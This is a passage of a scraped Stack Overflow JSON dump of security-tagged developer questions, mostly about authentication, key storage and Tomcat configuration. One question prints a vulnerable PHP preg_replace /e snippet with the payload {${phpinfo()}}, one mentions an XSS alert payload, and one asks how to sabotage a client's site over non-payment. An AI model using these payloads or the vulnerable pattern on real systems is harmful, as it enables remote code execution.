<strong>HandleUnauthorizedRequest</strong> method to this:</p>\n\n<pre><code> protected override void HandleUnauthorizedRequest(HttpActionContext filterContext)\n {\n     if (((System.Web.HttpContext.Current.User).Identity).IsAuthenticated)\n     {\n         filterContext.Response = new HttpResponseMessage(System.Net.HttpStatusCode.Forbidden);\n     }\n     else\n     {\n         base.HandleUnauthorizedRequest(filterContext);\n     }\n }\n</code></pre>\n\n<p>This allows me to return a status code of Forbidden to the web client if the failure was because of authorization instead of authentication and it can respond accordingly.</p>\n\n<p>So what is the proper way to set <strong>IsAuthenticated</strong> for the current <strong>Principle</strong> in this scenario?</p>\n"},{"tags":["security","monotouch","storage"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":66,"score":2,"question_id":12644304,"title":"How to store public/private key securely","body":"<p>Looking to store public/private key information securely on an iOS device. I know I want to store this in the KeyChain however I am not 100% sure what sort of attributes I need to populate in the <code>SecRecord</code>. I was going to do something like:</p>\n\n<pre><code>// private key\nSecKeyChain.Add(new SecRecord(SecKind.Key)\n{\n    Accessible = SecAccessible.AlwaysThisDeviceOnly,\n    KeySizeInBits = 512,\n    KeyClass = SecKeyClass.Private,\n    CanSign = true,\n    ValueData = privateKeyValue,\n    Account = publicKeyValue\n});\n</code></pre>\n\n<p>Which would store the private key, then follow a similar approach for the public key replacing the <code>Account</code> attribute with a value unique to the user e.g. username. However, not sure if this is the right way to use this.</p>\n\n<p>Does anyone have a good examples on how you would do this specifically for keys?</p>\n"},{"tags":["security","ssl","certificate","public-key-encryption"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12645128,"title":"Certificate & Hash checking?","body":"<p>I'm asking this question in order for be 100% sure.</p>\n\n<p><a href=\"http://ntrg.cs.tcd.ie/mepeirce/Dce/99/ssl/works.htm\" rel=\"nofollow\">link</a></p>\n\n<blockquote>\n  <p>To validate the certificate to ensure it contains the information\n  digitally signed by the certificate authority, the web browser\n  verifies the digital signature. Because the digital signature is an\n  encrypted hash value that was computed based on the contents of the\n  certificate, the web browser needs to compare hash values. The web\n  browser computes a hash value based on the contents of the certificate\n  it received. It then decrypts the digital signature to determine the\n  hash value that the certificate authority computed. If the two hash\n  values match, the web browser is assured that the certificate contains\n  the information that the certificate authority verified and digitally\n  signed.</p>\n</blockquote>\n\n<p>questions :</p>\n\n<blockquote>\n  <p>The web browser computes a hash value based on the contents of the\n  certificate it received</p>\n</blockquote>\n\n<p>The browser <em>knows</em> in which digest algorithm the certificate was used inside , so he uses it <em>also</em> to calculate a hash - based on the certificate content.</p>\n\n<blockquote>\n  <p>It then decrypts the digital signature to determine the hash value\n  that the certificate authority computed</p>\n</blockquote>\n\n<p>The browser knows which CA created the certificate , so he takes the public key from the appropriate <em>computer store location</em> and apply it on the encrypted hash value . the result is the decrypted hash value. </p>\n\n<p>It then see if both the same.</p>\n\n<p>Am I right ?</p>\n"},{"tags":["java","security","java-ee","tomcat"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2188,"score":0,"question_id":10838296,"title":"j_security_check on Tomcat","body":"<p>Do I have to do anything to activate Tomcat handling the call to j_security_check? The config &amp; HTML code is below. I am getting this error:</p>\n\n<p><strong>Error Message</strong></p>\n\n<p><em>type</em> Status report</p>\n\n<p><em>message</em> /(context path)/ProviderManager/j_security_check</p>\n\n<p><em>description</em> The requested resource (/(context path)/ProviderManager/j_security_check) is not available.</p>\n\n<p><strong>web.xml</strong></p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;web-app version=\"3.0\" xmlns=\"http://java.sun.com/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd\"&gt;\n    &lt;session-config&gt;\n        &lt;session-timeout&gt;\n            30\n        &lt;/session-timeout&gt;\n    &lt;/session-config&gt;\n\n    &lt;security-constraint&gt;\n        &lt;display-name&gt;Constraint1&lt;/display-name&gt;\n        &lt;web-resource-collection&gt;\n            &lt;web-resource-name&gt;ProviderManager&lt;/web-resource-name&gt;\n            &lt;description/&gt;\n            &lt;url-pattern&gt;/ProviderManager/*&lt;/url-pattern&gt;\n        &lt;/web-resource-collection&gt;\n        &lt;auth-constraint&gt;\n            &lt;description/&gt;\n            &lt;role-name&gt;tomcat&lt;/role-name&gt;\n        &lt;/auth-constraint&gt;\n    &lt;/security-constraint&gt;\n    &lt;login-config&gt;\n        &lt;auth-method&gt;FORM&lt;/auth-method&gt;\n        &lt;form-login-config&gt;\n            &lt;form-login-page&gt;/ProviderManager/login.jsp&lt;/form-login-page&gt;\n            &lt;form-error-page&gt;/ProviderManager/error.jsp&lt;/form-error-page&gt;\n        &lt;/form-login-config&gt;\n    &lt;/login-config&gt;\n    &lt;security-role&gt;\n        &lt;description/&gt;\n        &lt;role-name&gt;tomcat&lt;/role-name&gt;\n    &lt;/security-role&gt;\n&lt;/web-app&gt;\n</code></pre>\n\n<p><strong>tomcat-users.xml</strong></p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;tomcat-users&gt;\n\n  &lt;role rolename=\"tomcat\"/&gt;\n  &lt;role rolename=\"role1\"/&gt;\n\n  &lt;user username=\"tomcat\" password=\"tomcat\" roles=\"tomcat\"/&gt;\n  &lt;user username=\"both\" password=\"tomcat\" roles=\"tomcat,role1\"/&gt;\n  &lt;user username=\"role1\" password=\"tomcat\" roles=\"role1\"/&gt;\n\n  &lt;user username=\"ide\" password=\"mgPNx5x5\" roles=\"manager-script,admin\"/&gt;\n&lt;/tomcat-users&gt;\n</code></pre>\n\n<p><strong>login.html</strong></p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;%@page contentType=\"text/html\" pageEncoding=\"UTF-8\"%&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt;\n        &lt;title&gt;JSP Page&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;form action=\"j_security_check\" method=\"POST\"&gt;\n           Username:&lt;input type=\"text\" name=\"j_username\"&gt;&lt;br&gt;\n           Password:&lt;input type=\"password\" name=\"j_password\"&gt;\n           &lt;input type=\"submit\" value=\"Login\"&gt;\n        &lt;/form&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>Thanks-in-advance,</p>\n\n<p>Guido</p>\n"},{"tags":["android","security","data","policy"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12644536,"title":"Wipe Application Data Only","body":"<p>im Devlopping a 'Security' Application and im currently using Device Policy Manager , i can Successful do a Wipe , but im looking to Wipe All Application Data Only or Wipe Data from the Specified App Ex. : Wipe Kik Messenger Data(Conversation , Login ...) and keep all Applications ( especially My Application) i dont want a full Factory Reset or wipe /Data/App/ , is there any Way to do this ? Also , no matter if the device Require Root Access for your Given Solution(if you have one) ,</p>\n\n<p>Thanks .</p>\n"},{"tags":["security","ftp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":12644194,"title":"Security: FTP transfer on a public network","body":"<p>I have heard of security issues with the way FTP username and password is sent to the server for authentication. Is it safe to use FTP on a public network?</p>\n\n<p>In particular I use Notepad++ with ftp plugin that synch the file with the server on save (via ftp).</p>\n\n<p>Is it unsafe to be on a public network (say a university campus) and use FTP to connect to your server?</p>\n"},{"tags":["javascript","html5","security","canvas"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12643150,"title":"Why does browser limit usage of image from other domain in canvas?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12636697/why-does-my-navigator-tainted-a-canvas-when-an-image-from-an-other-domain-is-use\">Why does my navigator tainted a canvas when an image from an other domain is used?</a>  </p>\n</blockquote>\n\n\n\n<p>This is a reformulation of one of my precedent questions : <a href=\"http://stackoverflow.com/questions/12636697/why-does-my-navigator-tainted-a-canvas-when-an-image-from-an-other-domain-is-use\">one of my precedent questions</a></p>\n\n<p>For security reason a browser will limit usage of some function on a canvas after using an image from an other domain.</p>\n\n<p>What are this security reason? How can an image display in a canvas present a risk?</p>\n"},{"tags":["javascript","css","security","design","web"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":15,"view_count":141,"score":-15,"question_id":12643451,"title":"Locking Down a Website","body":"<p>I have a client I'm building a website for that plans on paying me after I'm complete.</p>\n\n<p>I'm building on their FTP.</p>\n\n<p>Is there any techniques to lock down the website to have it mess up completely when activated by me if they refuse to pay?</p>\n\n<p>Thanks </p>\n"},{"tags":["security","tomcat","struts2","spring-security","roles"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":142,"score":0,"question_id":12552383,"title":"Struts2 Authorization","body":"<p>I am about to graduate from university with a web application that needs be implemented at school, everything is working perfect and this needs to be ready before november but I'm having a real trouble taking care of the security. The application must be able to have different users with one or more different roles, ( user1: roles: student; user 2: admin, user 3: professor, boss ).</p>\n\n<p>When a user logs in it should be redirected to a different view depending on the roles it has and then if he tries to access to resources not allowed for his role, an error page should be shown.</p>\n\n<p>This is what I've tried so far:</p>\n\n<p><strong>Method 1:</strong> </p>\n\n<p>Authentication Method: Specified in web.xml as</p>\n\n<pre><code>&lt;login-config&gt;\n   &lt;auth-method&gt;FORM&lt;/auth-method&gt;\n   &lt;form-login-config&gt;\n      &lt;form-login-page&gt;/login.jsp&lt;/form-login-page&gt;\n   &lt;/form-login-config&gt;\n&lt;/login-config&gt;\n</code></pre>\n\n<p>Then using the names j_username and j_password along with j_security_check on a custom jsp.</p>\n\n<p>Authorization Method: Used Container Security (Tomcat) via <a href=\"http://tomcat.apache.org/tomcat-7.0-doc/realm-howto.html#DataSourceRealm\" rel=\"nofollow\">DataSourceRealm</a>, wich allow us to connect to a database and get the user and the roles associated with him from 2 Tables that need to be mapped in the server.xml:</p>\n\n<pre><code>&lt;Resource auth=\"Container\" driverClassName=\"com.microsoft.sqlserver.jdbc.SQLServerDriver\" maxActive=\"100\" maxIdle=\"30\" maxWait=\"1000\" name=\"jdbc/sstt\" password=\"pass\" type=\"javax.sql.DataSource\" url=\"jdbc:sqlserver://localhost;databaseName=BDTT\" username=\"sa\"/&gt;\n</code></pre>\n\n<p>web.xml:</p>\n\n<pre><code>&lt;security-constraint&gt;\n\n    &lt;web-resource-collection&gt;\n        &lt;web-resource-name&gt;Students Only&lt;/web-resource-name&gt;\n        &lt;url-pattern&gt;/student/*&lt;/url-pattern&gt;\n    &lt;/web-resource-collection&gt;\n\n    &lt;auth-constraint&gt;\n        &lt;role-name&gt;student&lt;/role-name&gt;\n    &lt;/auth-constraint&gt;\n\n&lt;/security-constraint&gt;\n\n// Same mapping for professor, admin, and boss (/professor/* maps to professor role)\n</code></pre>\n\n<p><strong>Results:</strong> Whenever I tried to access a restricted area, for example, /members/ (configured in the web.xml inside a security constraint) it would work just perfect, so authorization goal was achieved.</p>\n\n<p><strong>The problem:</strong> \nWhen I submit the login form it fires the j_security_check so I'm not able to fire a Struts2 Action that could help me to <strong>redirect depending on the user roles</strong> this is the main problem. Everything was perfect but I can't find a way to redirect after logging in with the Container security. </p>\n\n<p><strong>Method 2:</strong> </p>\n\n<p>Authentication Method: A LoginAction class that queries the database and checks if the password is correct. It also checks on the user roles and here we should be able to return a String like \"admin\", or \"student\" and redirect to the appropriate index.jsp resource, but that would work <strong>only if users were allowed to have only one role, but they can have many</strong>, so <strong>how should the view be constructed depending on the total user roles</strong>? What String would we return?</p>\n\n<p>Authorization Method: I wrote a custom Interceptor wich retrieves the User object from the session (this User object should be in the session only if the user authenticated successfully) and then perform the authorization logic here. </p>\n\n<p><strong>The problem:</strong> \nUnable to find a way to construct a view depending on several roles, and the problem about the Interceptor is that it only protects my actions, so the authorization goal was achieved but only on actions, that means I could write /students/ and the URL would change to /students/index.jsp without even trying to authorize.</p>\n\n<p><strong>Other plans</strong></p>\n\n<p>I was thinking that maybe I could use filters to achieve the authorization ( that way I could protect both the dynamic and static resources ) but I don't know if that would be a good practice since we have configured the Struts2 filter which maps to /*</p>\n\n<p>I was also looking that I could use <strong>JAAS</strong> or <strong>Spring Security</strong> but I don't know if I could achieve this, <strong>authenticate, redirect based on roles and authorizate</strong>. I wouldn't want to spend more several hours to find out that I can't do what I need, and I have just a very short time to finish this.</p>\n\n<p><strong>Other questions</strong></p>\n\n<p>Is it really a good practice to put jsp under WEB-INF? if so I should rewrite all the access to my jsp's in the struts.xml to WEB-INF/jsp/students/index.jsp? ( for example ). Or should I stick to a security constraint defined in web.xml to avoid direct access to the /jsp/* url pattern?</p>\n\n<p>Thank You very much in advance for all your time and help.</p>\n"},{"tags":["windows","security","internet-explorer","winapi"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":70,"score":2,"question_id":12642575,"title":"Changing Internet Explorer settings programmatically","body":"<p>In Internet Explorer, <strong>Internet Options -> Advanced</strong> we have Multiple <strong>check-box</strong> for settings.</p>\n\n<p>I want to programmatically manage all of them.</p>\n\n<p>I looked at Internet Explorer API but doesn't find much.</p>\n\n<p><strong>Edit</strong></p>\n\n<p>I want specifically Uncheck these two check boxes</p>\n\n<p><img src=\"http://i.stack.imgur.com/wYr49.jpg\" alt=\"enter image description here\"></p>\n\n<p>Please suggest.</p>\n"},{"tags":["c#","security","rest"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":36,"score":3,"question_id":12640662,"title":"Rest service sercurity","body":"<p>I have various c# rest services performing normal CRUD tasks on a database,</p>\n\n<p>For example, I have a rest service to add a customer to my customers database table which will expect XML as indicated below,</p>\n\n<pre><code>&lt;CreateCustomerRequest&gt;\n    &lt;Name&gt;Customer name&lt;/Name&gt;\n    &lt;Surname&gt;Customer surname&lt;/Surname&gt;\n&lt;/CreateCustomerRequest&gt;\n</code></pre>\n\n<p>Anyone that knows the URL and the proper XML structure can therefore call the rest service and insert a customer into my database. What is the best way to make sure that unauthorized inserts are not performed? Perhaps a key send with the request calculated as MD%([name field] + [surname field] + [shared client/server key]??</p>\n"},{"tags":["android","security","encryption","filesystems"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12640708,"title":"Check if Android filesystem is encrypted","body":"<p>We are developing secure application for Android. It's required for users to keep filesystems of their devices encrypted, but we have to check this fact and forbid to use app. Is it possible to check if filesystem is encrypted? Also there are some devices with Android &lt; 3.0 that supports encryption, for example Motorola RAZR. It would be interesting to know about encryption on such devices.</p>\n"},{"tags":["c#","wcf","security","ws-discovery","xp-mode"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12632650,"title":"WCF Discovery in XP mode","body":"<p>From <a href=\"http://msdn.microsoft.com/en-us/magazine/ee335779.aspx\" rel=\"nofollow\">Discover a New WCF with Discovery</a> example, I modified </p>\n\n<pre><code>      public static Uri AvailableTcpBaseAddress\n      {\n         get\n         {\n            //return new Uri(\"net.tcp://localhost:\" + FindAvailablePort() + \"/\");\n            return new Uri(\"net.tcp://\" +  ipAddr() + \":\" + FindAvailablePort() + \"/\");\n         }\n      }\n\n      private static string ipAddr()\n      {\n          return Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip =&gt; ip.AddressFamily == AddressFamily.InterNetwork).ToString();\n      }\n</code></pre>\n\n<p>By changing <code>localhost</code> to <code>ipAddr()</code>, I am able to test the UDP WCF discovery from two separate machines in the same subnet. (Note: Without the change, the example only work if both host and client on the same machine). To ease my development, I would like to test in my Windows 7 XP mode, so I do not need to bring two machines. However, either I run host or client on XP mode, I got \"<strong>the server has rejected the client credentials</strong>\" error. Answer from <a href=\"http://stackoverflow.com/a/8845369/418439\">http://stackoverflow.com/a/8845369/418439</a> could not help me as it is for netTcpBinding.</p>\n"},{"tags":["php","javascript","web-services","security","solr"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12629598,"title":"Securely Query Solr with Javascript","body":"<p>I have a Solr server setup, working great, and sitting behind an Apache proxy server which limits access to a range of IP's.</p>\n\n<p>To date our application(built in ZF/PHP) would use a PHP proxy function to query the Solr instance.(the ZF server's IP is allowed) however, I've been testing a new interface and have noticed querying Solr directly from JS is light-years faster than using PHP code to proxy things.  </p>\n\n<p>The page I'm testing runs 25+ solr queries per page load.  Using pure JS this loads great,  using PHP -not even close to usable.</p>\n\n<p>Is there a way to proxy the client-side using jQuery or something much faster than PHP?</p>\n\n<p>I've been searching for days, reading on various types of proxies, reverse proxies, securely querying webservices without exposing keys, etc.. But I'm still a bit lost as to the best way to query services using JS.  </p>\n\n<p>Any tutorials or advice would be much appreciated, cheers!</p>\n"},{"tags":["javascript","security","node.js","deployment","obfuscation"],"answer_count":2,"favorite_count":2,"up_vote_count":6,"down_vote_count":1,"view_count":1109,"score":5,"question_id":9413123,"title":"Secure distribution of NodeJS applications","body":"<p><strong>What:</strong> Can NodeJS apps be distributed as binary? ie. you compile the .js app via V8 into its native binary, and distribute the binary to clients? (if you had total access to the NodeJS server)... or is minifying the code all you can do?</p>\n\n<p><strong>Why:</strong> We build serverside applications in NodeJS for clients, that have often to be hosted on the client's servers. Distributing source code means clients can easily steal our solution and stop paying licensing fees. This opens up the possibility of easy reverse-engineering or reuse of our apps without our awareness.</p>\n"},{"tags":["javascript","ajax","web-services","security","wcf-web-api"],"answer_count":5,"favorite_count":7,"up_vote_count":18,"down_vote_count":0,"view_count":1730,"score":18,"question_id":6302341,"title":"Web services API Keys and Ajax - Securing the Key","body":"<p>This is probably a generic security question, but I thought I'd ask in the realm of what I'm developing.</p>\n\n<p>The scenario is: A web service (WCF Web Api) that uses an API Key to validate and tell me who the user is, and a mix of jQuery and application on the front ends.</p>\n\n<p>On the one hand, the traffic can be https so it cannot be inspected, but if I use the same key per user (say a guid), and I am using it in both then there's the chance it could be taken and someone could impersonate the user.</p>\n\n<p>If I implement something akin to OAuth, then a user and a per-app key is generated, and that could work - but still for the jQuery side I would need the app API key in the javascript.</p>\n\n<p>This would only be a problem if someone was on the actual computer and did a view-source.</p>\n\n<p>What should I do?</p>\n\n<ol>\n<li>md5 or encrypt the key somehow?</li>\n<li>Put the key in a session variable, then when using ajax retrieve it?</li>\n<li>Get over it, it's not that big a deal/problem.</li>\n</ol>\n\n<p>I'm sure it's probably a common problem - so any pointers would be welcome.</p>\n\n<p><strong>To make this clearer</strong> - this is my API I have written that I am querying against, not a google, etc.  So I can do per session tokens, etc, I'm just trying to work out the best way to secure the client side tokens/keys that I would use.</p>\n\n<p>I'm being a bit overly cautious here, but just using this to learn.</p>\n"},{"tags":["java","spring","security","spring-security"],"answer_count":2,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":263,"score":7,"question_id":10240989,"title":"Spring security authentication management vulnerability","body":"<p>Spring documentation says that remember me is implemented by storing following information in cookie - </p>\n\n<blockquote>\n  <p>base64(username + \":\" + expirationTime + \":\" + md5Hex(username + \":\" +\n  expirationTime + \":\" password + \":\" + key))</p>\n</blockquote>\n\n<p>I have following confusions - </p>\n\n<ol>\n<li><p>Why use an unsecure hash like MD5 to digest the information instead of using SHA-1 or SHA-2. Would the performance hit from these be significant for such a small piece of information?</p></li>\n<li><p>Why transmit this information over the network at all? Why not maintain a map of cryptographically secure random number and this info on the server, returning only the map key as a cookie. AFAIK this is the approach used by Servlet API and is deemed more secure.</p></li>\n</ol>\n"},{"tags":["javascript","security","search","internet","xss"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12637828,"title":"Difference between typing and pasteing in a field","body":"<p>If I use xss, what's the difference between typing in ALERT('DSSA');, or just paste it to a search textfield? In a site, typing works, and makes the alert, but if I just paste it, than it doesn't. To prevent the question, I don't want to hack any site, I'm just interested in network security.</p>\n\n<p>thanks for the answer</p>\n"},{"tags":["php","security","code-injection"],"answer_count":2,"favorite_count":4,"up_vote_count":11,"down_vote_count":0,"view_count":88,"score":11,"question_id":12636586,"title":"What is {${phpinfo()}} called? (Remote Command Execution related)","body":"<p>I hope someone can answer this for me as I've been fairly curious about it for quite some time, haven't seemed to be able to obtain an answer though.\nHowever, I'm sure someone here will be able to as there are some very intelligent people here.</p>\n\n<p>Now, to the question.\nI'll be using a Remote Command Execution vulnerability as an example.</p>\n\n<pre><code>&lt;?php echo preg_replace('/(.*)/e', 'strtoupper(\"\\\\1\")', $argv[1]); ?&gt;\n</code></pre>\n\n<p>To exploit this the attacker would simply input <code>{${phpinfo()}}</code> for example.\nMy questions are as follows:</p>\n\n<ol>\n<li>What are the braces <code>{}</code> for and why does it look like a\nvariable?</li>\n<li>Does it have a name of some kind? I don't believe it's a variable function since they're different, no?</li>\n</ol>\n\n<p>Thank you!</p>\n"},{"tags":["javascript","html5","security","canvas"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":36,"score":2,"question_id":12636697,"title":"Why does my navigator tainted a canvas when an image from an other domain is used?","body":"<p>When you put an image from an other domain in a canvas, the canvas is tainted and some functions like getDataURL or getImageData are disable.</p>\n\n<p>When you try to use such function a SECURITY_ERROR error happen.</p>\n\n<p>Why is this protection in place? What sort of attack used this method? </p>\n\n<p>Thanks!</p>\n\n<p>edited : </p>\n\n<p>I should ask : How can an image coming from an other domain be used in a attack?\n   I can't figure out why browser limit used of canvas after beeing tainted.   </p>\n"},{"tags":["security","tomcat","realm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12636167,"title":"How to restrict users from directly accessing login.jsp?","body":"<p>I'm using the realm feature of tomcat and users not authenticated will be redirected to login.jsp. However if a user directly signs in using that page, he will be given a \"HTTP Status 400 - Invalid direct reference to form login page\" error.  </p>\n\n<p>So I'm thinking of a way that could avoid accessing that page directly? How can I achieve that? Thanks.</p>\n"},{"tags":["php","forms","security","email","spam"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12635651,"title":"PHP secure email is blocking the false emails but letting the registration go through","body":"<p>I am trying to make a form that is secure from spam and sends a simple email to the person who registers. </p>\n\n<p>Im quite new to PHP and the problem im faced with is when the form is submitted with a false email address in the email field, it brings up the error message stating that the email is invalid, but still lets the registration go through adding it to the database.</p>\n\n<p>here is the code</p>\n\n<pre><code>function spamcheck($field) {\n    // filter_var() sanitizes the e-mail\n    // address using FILTER_SANITIZE_EMAIL\n    $field = filter_var($field, FILTER_SANITIZE_EMAIL);\n\n    // filter_var() validates the e-mail\n    // address using FILTER_VALIDATE_EMAIL\n    if(filter_var($field, FILTER_VALIDATE_EMAIL)) {\n        return TRUE;\n    }\n    else {\n        return FALSE;\n    }\n}\n\nif(isset($_REQUEST['email'])) {\n    // if \"email\" is filled out, proceed\n    // check if the email address is invalid\n    $mailcheck = spamcheck($_REQUEST['email']);\n    if ($mailcheck==FALSE) {\n        die(\"&lt;font color='red'&gt;Your email address is invalid, please try again.&lt;/font&gt;&lt;br/&gt;&lt;br/&gt;&lt;form&gt;&lt;INPUT TYPE='button' VALUE='Back' onClick='history.go(-1);return true;'&gt;&lt;/form&gt;\");\n    }\n    else {//send email\n        $to = \"$email\";\n        $from = \"name@mywebsite.com\";\n        $message = \"Just a message\";\n        $subject = \"Subject\";\n\n        mail($to, $message, $subject, \"From: $from\", \"-f$from\");\n    }\n}\n</code></pre>\n\n<p>Any help would be greatly appreciated.</p>\n"},{"tags":["java","security","java-web-start","webstart"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12633227,"title":"Client security of Java Web Start","body":"<p>I am deploying an application with java web start, but I am encountering a problem.</p>\n\n<p>When I complete the deployment, I replace the <code>jar</code> package in client's cache directory with another <code>jar</code> package, but the application runs the  latter <code>jar</code>. I have configured the security attributes in the <code>JNLP</code> file and signed the <code>jar</code> package  by <code>keytools</code>.I think the <code>JWS</code> should check the  <code>jar</code> package legitimacy, and it should not run after being changed.</p>\n\n<p>How does the <code>JWS</code> checks the local signed <code>jar</code> package has been changed?</p>\n"},{"tags":["android","security","ice-cream-sandwich","bouncycastle"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":11463924,"title":"Running apps using bouncy castle on ICS","body":"<p>I have developed an application that uses bouncy castle provider for generating keystore. Everything was working fine on Gingerbread(2.3.3) until i updated my test device with ICS. Now, its not able to find the bouncy castle provider. \nI'm getting this exception:</p>\n\n<p>07-11 12:40:51.317 E/AndroidRuntime( 8049): Caused by: java.lang.NoClassDefFoundError: org.bouncycastle.jce.provider.BouncyCastleProvider</p>\n\n<p>I searched about this and figured that in ICS, a trust store has been introduced and i want to know whether bouncy castle can still be used in ICS. I have seen some threads related to bouncy castle provider, but couldn't get the solution. Please help.</p>\n\n<p>Thanks,\nDeepak</p>\n"},{"tags":["asp.net","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12633173,"title":"Asp.Net website link when clicked from Word document throws runtime error","body":"<p>e are facing a strange error. \nI have an asp.net4.0 website which is running fine. But if someone put it's link in a word document and clicks first time it works but when clicked second time it throws runtime error.</p>\n\n<p>=============== Application Warning ==========\nEvent code: 3003 \nEvent message: A validation error has occurred. \nEvent time: 9/27/2012 5:11:47 PM \nEvent time (UTC): 9/27/2012 10:11:47 PM \nEvent ID: 17a66c61de004c17a6d562fc7b355ac1 \nEvent sequence: 4 \nEvent occurrence: 1 \nEvent detail code: 0 </p>\n\n<p>Application information: \n    Application domain: /LM/W3SVC/3/ROOT-2-129932570396136079 \n    Trust level: Full \n    Application Virtual Path: / \n    Application Path: E:\\Inetpub\\wwwroot\\ </p>\n\n<p>================================================</p>\n\n<p>Exception information</p>\n\n<p>Exception information: \nException type: HttpRequestValidationException \nException message: A potentially dangerous Request.Form value was detected from the client </p>\n\n<p>===================================================================</p>\n\n<p>I am not able to conclude the reason behind this issue.</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["iphone","security","encryption","client-server"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12630923,"title":"How to prevent connection to the server without my client application?","body":"<p>A client asked me to do a back-end server for its iPhone application and want only users who bought the application to be able to call the server.\nThe problem is that he doesn't want to add a login system to the application, so that it seems to me there is no completely safe way to prevent someone without his application calls the server.\nIn any case, even if it can not be completely prevented, it would be sufficient to make it difficult to access servers without the application.</p>\n\n<p>What is the best way to achieve this? Again, I do not need to fully protect the connection, there is no transit of sensitive information, I just want to make things a little more complicated for people who want to take advantage of server without paying the application.</p>\n\n<p>The idea that seems most simple is to encrypt the data with a key stored within the client and known to the server, so that the message can be decrypted only decompiling the code and finding the key (of course instead of a key you could put a list of keys, which change every 6/12/24 hours).</p>\n\n<p>Could this be a reasonable solution?</p>\n"},{"tags":["javascript","security","obfuscation","research","malicious"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":10835832,"title":"Collection of malicious or obfuscated Javascript?","body":"<p>I'm working on an academic project involving analysing obfuscation, and I'd like to find a reasonably sizeable collection of Javascript code known (or at least suspected) to be obfuscated to work with. My initial idea is that security organisations might provide collections of malicious code for research purposes, which is likely to be obfuscated in some way, but so far my searches have been fruitless.</p>\n\n<p>Do you know of any good sources? Many thanks.</p>\n"},{"tags":["asp.net-mvc-3","security","authorization","action-filter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12631325,"title":"ActionFilterAttribute for Authorization","body":"<p>I need to implement some authorization mechanism in my application. The authorization is based on object which are sent from client to serwer. Every action in a controller take as an argument List. Based on nested property of objects in this list I have to grant or deny access to controller action. My first approach was to use custom filter attribute </p>\n\n<pre><code>public class CustomAuthAttribute : FilterAttribute,IAuthorizationFilter\n{\n    public void OnAuthorization(AuthorizationContext filterContext)\n    {\n        //SOME LOGIC HERE\n    }\n}\n</code></pre>\n\n<p>However, because of the fact that the request is json request, it is hard for me to get values of every relevant property of sent objects (I have only acces to json values). That is why I thought that I could use ActionFilterAttribute instead of FilterAttribute.</p>\n\n<pre><code> public class ActionFilterAuthorization: ActionFilterAttribute\n{\n    public override void OnActionExecuting(ActionExecutingContext filterContext)\n    {\n\n        var castedList = filterContext.ActionParameters[\"key\"] as List&lt;MyObject&gt;;\n        //logic here \n\n       //throw exception is access is not granted\n\n    }\n}\n</code></pre>\n\n<p>The question is if this is good solution for authorization? Maybe it would be better to check authorization inside of actions ?? </p>\n"},{"tags":["git","security","github","git-push","git-reset"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12627509,"title":"is there any security issues if i add the public key of a public host to my github's accout?","body":"<p>that means others may push to my git repos which are hosted on github, so can anybody use</p>\n\n<pre><code>git reset --hard first-commit-id\ngit push\n</code></pre>\n\n<ol>\n<li><p>will this destroy my git repos hosted on github?</p></li>\n<li><p>will i lost of my history, if some bad guy run the above command?</p></li>\n</ol>\n\n<p>this issue is not the same as <a href=\"http://stackoverflow.com/questions/6742555/how-do-i-remove-my-public-key-from-github\">how do I remove my public key from 